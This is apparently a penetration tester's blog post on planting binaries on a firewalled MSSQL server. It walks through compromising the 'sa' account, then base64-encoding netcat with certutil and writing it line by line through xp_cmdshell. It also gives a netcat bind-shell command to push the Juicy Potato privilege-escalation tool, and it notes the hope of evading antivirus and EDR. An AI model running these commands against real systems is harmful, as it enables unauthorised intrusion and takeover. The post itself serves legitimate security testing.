---
layout: post
title: Exfiltrating files using MSSQL
excerpt_separator: <!--more-->
---

A scenario where we have to upload files to a server whose MSSQL credentials we know (so we have remote code execution) but the server is in other network. For that, we will transfer the base64-encoded file line by line.

<!--more-->


We have a jump server which allows us to access a Kali machine, used to scan a remote network. 

![img1](https://raw.githubusercontent.com/ricardojoserf/ricardojoserf.github.io/master/images/mssql-exfiltration/image1.png)

From Kali, we see there is a MSSQL server and after guessing the credentials of the user "sa", we have RCE there. 

![img2](https://raw.githubusercontent.com/ricardojoserf/ricardojoserf.github.io/master/images/mssql-exfiltration/image2.png)

However, the firewall rules make it impossible to download files from the jump server, the Kali machine or Internet:

![img3](https://raw.githubusercontent.com/ricardojoserf/ricardojoserf.github.io/master/images/mssql-exfiltration/image3.png)

We have a foothold in the netwotk but the firewalls configutaion and network segmentation make it a little difficult to continue. However, privilege escalation in this machine would be easy, as the account running the MSSQL server is a service account with the *SeImpersonatePrivilege* privilege and the OS is Windows Server 2016, being possible to escalate to SYSTEM with the Juicy Potato exploit:

![img4](https://raw.githubusercontent.com/ricardojoserf/ricardojoserf.github.io/master/images/mssql-exfiltration/image4.png)

So, how could we get a reverse shell or upload the Juicy Potato binary? If we check blogs [like this one](https://book.hacktricks.xyz/exfiltration), they mention certutil to base64-encode and then decode the files:

```bash
certutil -encode payload.dll payload.b64
certutil -decode payload.b64 payload.dll
```

So the idea is to encode a Windows binary, paste the content with mssqlclient.py and then decode it in the server, hopefully not triggering an antivirus, EDR or similar in the process. 

So first let's encode a Netcat binary:

```bash
certutil -encode nc.exe nc.txt
```

Generating a file like this one:

![img5](https://raw.githubusercontent.com/ricardojoserf/ricardojoserf.github.io/master/images/mssql-exfiltration/image5.png)

But with the mssqlclient.py script I had problems with the length of the encoded payload. However, after pasting the payload in a Linux machine, the payload can be splitted and generate commands to upload the file line by line:

```bash
while read p; do echo "xp_cmdshell echo $p >> c:\\\\windows\\\\tasks\\\\nc.txt"; echo; done < /tmp/nc.txt > commands.txt
```

We get a file ("commands.txt") with one command per line of the encoded payload:

![img6](https://raw.githubusercontent.com/ricardojoserf/ricardojoserf.github.io/master/images/mssql-exfiltration/image6.png)

After copying all the content of the file and pasting it in the command line with a mssqlclient.py session open, we will generate a text file in c:\windows\tasks, which can be decoded then with:

```bash
xp_cmdshell certutil -decode c:\windows\tasks\nc.txt c:\windows\tasks\nc.exe
```

Luckily, after uploading this file I realized that there was not any antivirus in the machine and the Windows firewall was disabled, so it was as easy as uploading the file using bind shells insted of reverse shells. So in the compromised server the command was:

```bash
xp_cmdshell c:\windows\tasks\nc.exe -lvp 8888 > c:\windows\tasks\juicypotato.exe
```

And from the Kali machine:

```bash
nc -nv 10.100.10.10 8888 < juicypotato.exe
```

With those two binaries and being able to create bind shells, it is fairly easy to become SYSTEM, for example creating a second bind shell. And with that, we would have succeded!
